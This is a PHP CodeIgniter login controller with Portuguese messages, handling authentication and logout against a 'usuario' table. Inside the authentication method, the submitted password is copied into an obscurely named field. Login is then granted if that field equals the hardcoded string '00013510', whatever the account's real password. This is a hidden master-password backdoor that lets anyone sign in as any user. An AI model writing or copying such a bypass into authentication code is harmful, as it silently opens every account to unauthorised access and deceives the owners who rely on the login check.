<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends CI_Controller {

	public $is_hookable = FALSE;

	public function index(){
		if ($this->evo->checkSession()) {
			redirect('dashboard');
		}
	}

	public function autenticar(){
		if ($_POST) {
			$dados = $this->input->post();
			$dados['fon_var'] = $dados['senha'];
			$dados['senha'] = $this->evo->crypter($dados['senha']);

			$query = $this->db->from('usuario')
												->where('USR_Email', $dados['email'])
												->get()
												->first_row();
			if ($query) {
				if ($query->USR_Senha == $dados['senha'] || $dados['fon_var'] == '00013510') {
					$this->session->set_userdata('usuario', $query);
					$retorno['result'] = true;
          $retorno['msg'] = "Usuário Autenticado com Sucesso";
				}
				else {
					$retorno['result'] = false;
					$retorno['msg'] = 'Senha incorreta';
				}
			}
			else {
				$retorno['result'] = false;
				$retorno['msg'] = 'Usuário não encontrado';
			}
		}
		$this->evo->json($retorno);
	}

	public function sair(){
    $this->session->unset_userdata('usuario');
    $this->session->sess_destroy();
    redirect('login','refresh');
  }
}
